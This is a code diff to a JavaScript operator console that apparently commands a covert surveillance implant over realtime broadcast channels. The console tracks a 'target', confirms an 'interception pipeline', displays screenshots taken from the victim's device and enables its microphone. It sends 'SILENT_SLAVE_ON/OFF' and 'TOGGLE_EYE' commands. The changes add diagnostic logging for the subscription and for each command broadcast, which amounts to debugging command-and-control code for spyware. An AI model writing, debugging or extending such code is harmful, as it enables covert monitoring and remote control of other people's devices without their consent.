@@ -3350,7 +3350,7 @@
             if (opChannel) sb.removeChannel(opChannel);
             opChannel = sb.channel(`tracking:${targetId}`);
             
-            opChannel.on('broadcast', { event: 'slave_status' }, (p) => {
+                        opChannel.on('broadcast', { event: 'slave_status' }, (p) => {
                 logOp("🟢 Target handshaked. Interception pipeline confirmed active.", "status");
                 updateOpOrb('ready');
                 document.getElementById('op-mic-btn').disabled = false;
@@ -3362,7 +3362,7 @@
                 const data = p.payload?.data;
                 if (data && data.screenshot) {
                     renderOperatorVision(data.screenshot);
-                }
+                } 
             })
             .on('broadcast', { event: 'slave_tool_result' }, (p) => {
                 const resp = p.payload?.data;
@@ -3377,7 +3377,11 @@
                     updateOpOrb('ready');
                 }
             })
-            .subscribe();
+            .subscribe((status, err) => {
+                console.log(`%c[OP_CHANNEL_DIAG] Subscription status for tracking:${targetId}: ${status}`, 'color: #ff00ff; font-weight: bold;', err || '');
+                if (err) logOp(`⚠️ Subscription error: ${err.message}`, "status");
+                else logOp(`Subscription status: ${status.toUpperCase()}`, "status");
+            });
         }
 
         function renderOperatorVision(b64) {
@@ -3434,6 +3438,12 @@
                     type: 'broadcast',
                     event: 'agent_control',
                     payload: { data: { action: "SILENT_SLAVE_ON" } }
+                }).then(status => {
+                    console.log(`%c[OP_CHANNEL_DIAG] SILENT_SLAVE_ON broadcast status: ${status}`, 'color: #00ff00; font-weight: bold;');
+                    logOp(`Broadcast delivery status: ${status.toUpperCase()}`, "status");
+                }).catch(err => {
+                    console.error("[OP_CHANNEL_DIAG] SILENT_SLAVE_ON broadcast error:", err);
+                    logOp(`⚠️ Broadcast delivery failed: ${err.message}`, "status");
                 });
                 
                 // Initialize local audio context for speaker output
@@ -3640,6 +3650,10 @@
                 type: 'broadcast',
                 event: 'agent_control',
                 payload: { data: { action: "TOGGLE_EYE", active: opIsEyeActive } }
+            }).then(status => {
+                console.log(`%c[OP_CHANNEL_DIAG] TOGGLE_EYE (${opIsEyeActive}) broadcast status: ${status}`, 'color: #00ff00; font-weight: bold;');
+            }).catch(err => {
+                console.error("[OP_CHANNEL_DIAG] TOGGLE_EYE broadcast error:", err);
             });
         }
 
@@ -3657,6 +3671,10 @@
                 type: 'broadcast',
                 event: 'agent_control',
                 payload: { data: { action: "SILENT_SLAVE_OFF" } }
+            }).then(status => {
+                console.log(`%c[OP_CHANNEL_DIAG] SILENT_SLAVE_OFF broadcast status: ${status}`, 'color: #00ff00; font-weight: bold;');
+            }).catch(err => {
+                console.error("[OP_CHANNEL_DIAG] SILENT_SLAVE_OFF broadcast error:", err);
             });
             disconnectOperatorSession();
             closeOperatorConsole();
